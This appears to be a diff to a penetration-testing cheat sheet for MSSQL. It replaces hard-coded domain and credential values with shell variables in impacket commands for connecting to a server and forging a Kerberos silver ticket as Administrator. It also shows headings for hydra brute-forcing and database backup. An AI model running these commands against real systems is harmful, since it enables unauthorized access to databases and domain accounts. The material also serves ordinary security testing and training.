@@ -13,7 +13,7 @@ nmap -sU -p 1434 $IP
 ## Connect with impacket-mssqlclient
 ```bash
 impacket-mssqlclient sa:password@$IP
-impacket-mssqlclient domain.local/user:password@$IP -windows-auth
+impacket-mssqlclient "$DOMAIN"/"$USER":"$PASS"@$IP -windows-auth
 ```
 
 ## Brute force MSSQL with hydra
@@ -120,9 +120,9 @@ BACKUP DATABASE database_name TO DISK = 'c:\temp\database_backup.bak';
 
 ## Forge a silver ticket for MSSQL
 ```bash
-impacket-ticketer -nthash <service_nt_hash> -domain-sid <domain_sid> -domain domain.local -spn MSSQL/sql.domain.local -user-id 500 Administrator
+impacket-ticketer -nthash <service_nt_hash> -domain-sid <domain_sid> -domain "$DOMAIN" -spn "MSSQL/sql.$DOMAIN" -user-id 500 Administrator
 export KRB5CCNAME=$PWD/Administrator.ccache
-impacket-mssqlclient -k sql.domain.local
+impacket-mssqlclient -k "sql.$DOMAIN"
 ```
 
 ## Read a file over MSSQL with a silver ticket
